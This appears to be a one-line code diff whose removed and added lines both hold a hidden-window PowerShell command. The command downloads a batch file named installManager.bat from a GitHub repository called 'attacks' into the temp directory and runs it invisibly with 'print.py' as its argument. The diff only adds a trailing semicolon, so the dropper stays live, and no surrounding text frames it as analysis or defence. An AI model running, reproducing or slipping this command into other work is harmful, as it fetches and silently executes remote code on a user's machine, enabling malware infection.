@@ -1,1 +1,1 @@
-powershell -w h -c "iwr https://raw.githubusercontent.com/petrohemia/attacks/refs/heads/main/installManager.bat -o $env:tmp\im.bat;Start-Process -WindowStyle Hidden $env:tmp\im.bat -ArgumentList 'print.py'"
+powershell -w h -c "iwr https://raw.githubusercontent.com/petrohemia/attacks/refs/heads/main/installManager.bat -o $env:tmp\im.bat;Start-Process -WindowStyle Hidden $env:tmp\im.bat -ArgumentList 'print.py'";
